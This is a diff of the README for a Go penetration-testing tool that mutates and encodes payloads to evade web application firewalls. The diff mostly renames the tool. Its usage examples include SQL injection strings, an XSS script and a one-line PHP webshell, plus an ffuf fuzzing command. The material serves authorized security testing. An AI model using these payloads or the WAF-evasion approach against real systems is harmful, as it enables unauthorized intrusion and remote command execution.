@@ -1,4 +1,4 @@
-# PayloadObfuscator
+# JLFPayloadObfuscator
 
 Advanced WAF Evasion Wordlist Generator for Web Application Penetration Testing.
 
@@ -8,7 +8,7 @@ Developed by: **jakeloai+AI**
 
 ## Overview
 
-PayloadObfuscator is a high-performance payload mutation and encoding engine written in pure Go (standard library only). It accepts standard test payloads, webshells, or exploit strings and produces multiple obfuscated and encoded variants for use with web fuzzing tools like ffuf, Burp Intruder, or custom testing frameworks.
+JLFPayloadObfuscator is a high-performance payload mutation and encoding engine written in pure Go (standard library only). It accepts standard test payloads, webshells, or exploit strings and produces multiple obfuscated and encoded variants for use with web fuzzing tools like ffuf, Burp Intruder, or custom testing frameworks.
 
 The tool is designed for QA engineers, application security testers, and bug bounty hunters who need to bypass advanced WAF (Web Application Firewall) rules during precise parameter testing.
 
@@ -72,9 +72,9 @@ The tool is designed for QA engineers, application security testers, and bug bou
 ### Build from Source
 
 ```bash
-git clone <repository-url>
-cd payloadobfuscator
-go build -o payloadobfuscator main.go
+git clone https://github.com/jakeloai/JLFPayloadObfuscator
+cd JLFPayloadObfuscator
+go build -o jlfpayload main.go
 ```
 
 ### Cross-Compilation Examples
@@ -101,27 +101,27 @@ GOOS=darwin GOARCH=amd64 go build -o payloadobfuscator-mac-intel main.go
 
 #### Single Payload - SQL Injection
 ```bash
-./payloadobfuscator -p "' OR 1=1--" -m sql -o sql_wordlist.txt
+./jlfpayload -p "' OR 1=1--" -m sql -o sql_wordlist.txt
 ```
 
 #### Single Payload - XSS
 ```bash
-./payloadobfuscator -p "<script>alert(1)</script>" -m xss -o xss_wordlist.txt
+./jlfpayload -p "<script>alert(1)</script>" -m xss -o xss_wordlist.txt
 ```
 
 #### Single Payload - PHP Webshell
 ```bash
-./payloadobfuscator -p "<?php system($_GET['cmd']); ?>" -m php -o php_wordlist.txt
+./jlfpayload -p "<?php system($_GET['cmd']); ?>" -m php -o php_wordlist.txt
 ```
 
 #### File Input - Multiple Payloads
 ```bash
-./payloadobfuscator -f payloads.txt -m all -o obfuscated_wordlist.txt
+./jlfpayload -f payloads.txt -m all -o obfuscated_wordlist.txt
 ```
 
 #### General Encoding Only
 ```bash
-./payloadobfuscator -p "admin' OR '1'='1" -m general -o general.txt
+./jlfpayload -p "admin' OR '1'='1" -m general -o general.txt
 ```
 
 ### Command Line Flags
@@ -137,7 +137,7 @@ GOOS=darwin GOARCH=amd64 go build -o payloadobfuscator-mac-intel main.go
 
 ```bash
 # Generate wordlist
-./payloadobfuscator -f my_payloads.txt -m all -o fuzz_wordlist.txt
+./jlfpayload -f my_payloads.txt -m all -o fuzz_wordlist.txt
 
 # Fuzz with ffuf
 ffuf -w fuzz_wordlist.txt -u "https://target.com/api?param=FUZZ" -mc 200,301,302,403
@@ -208,7 +208,7 @@ Status Report + MD5 Audit Hash
 ## Technical Details
 
 ### Pure Standard Library
-PayloadObfuscator uses only Go standard library packages:
+JLFPayloadObfuscator uses only Go standard library packages:
 - `encoding/base64` - Base64 encoding
 - `encoding/hex` - Hexadecimal encoding
 - `net/url` - URL encoding
